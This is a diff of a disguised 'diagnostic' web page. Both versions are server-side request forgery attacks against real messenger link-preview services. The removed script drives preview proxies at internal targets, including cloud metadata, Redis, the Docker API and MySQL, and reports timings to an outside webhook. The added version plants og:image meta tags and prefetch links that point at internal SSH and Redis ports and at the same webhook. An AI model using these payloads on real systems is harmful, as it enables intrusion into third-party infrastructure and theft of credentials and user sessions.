@@ -1,61 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>Checking System Configuration...</title>
+    <title>Diagnostic Page</title>
+
+    <meta property="og:image" content="http://127.0.0.1.nip.io:22/favicon.ico?from_server=89.124.11.6&target=ssh&webhook=https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4">
+    
+    <meta property="og:image" content="http://127.0.0.1.nip.io:6379/logo.png?from_server=89.124.11.6&target=redis">
+
+    <link rel="prefetch" href="https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4/?log=server_visited_me">
 </head>
 <body>
     <script>
-        (async function() {
-            const webhook = "https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4";
-            
-            // Список эндпоинтов, которые в мессенджерах обычно делают SSRF-запросы
-            const proxyEndpoints = [
-                "https://web.max.ru/api/v1/utils/preview?url=",
-                "https://web.max.ru/api/preview?url=",
-                "https://max.ru/proxy?url=",
-                "https://oneme.ru/api/link/preview?url="
-            ];
-
-            // Цели внутри сети VK/MAX (самые сочные для выплаты 1.2M)
-            const internalTargets = [
-                "http://169.254.169.254.nip.io/latest/meta-data/", // Облачные ключи (AWS/OpenStack)
-                "http://127.0.0.1.nip.io:6379",                   // Redis (Сессии пользователей)
-                "http://127.0.0.1.nip.io:2375/v1.24/containers/json", // Docker API (RCE)
-                "http://127.0.0.1.nip.io:3306",                   // MySQL
-                "http://127.0.0.1.nip.io:80/server-status"        // Apache Status
-            ];
-
-            async function fire(pUrl, target) {
-                const cb = Math.random().toString(36).substring(7);
-                const finalTarget = `${target}?cache=${cb}`;
-                const start = Date.now();
-                
-                try {
-                    // Делаем запрос через прокси сервера
-                    await fetch(`${pUrl}${encodeURIComponent(finalTarget)}`, { 
-                        mode: 'no-cors',
-                        cache: 'no-store'
-                    });
-                } catch (e) {}
-
-                const duration = Date.now() - start;
-
-                // Отправляем отчет на твой бин
-                // Если time > 3000ms — это подтвержденная SSRF
-                fetch(`${webhook}?type=exploit&target=${btoa(target)}&time=${duration}&via=${btoa(pUrl)}`);
-            }
-
-            // Основной цикл атаки
-            for (let proxy of proxyEndpoints) {
-                for (let target of internalTargets) {
-                    await fire(proxy, target);
-                    // Небольшая пауза, чтобы не забанили по IP
-                    await new Promise(r => setTimeout(r, 500));
-                }
-            }
-        })();
+        // Это остается для твоего браузера, чтобы ты видела, что страница жива
+        fetch("https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4/?log=browser_check");
     </script>
-    <h2>System diagnostic in progress. Do not close this page.</h2>
 </body>
 </html>
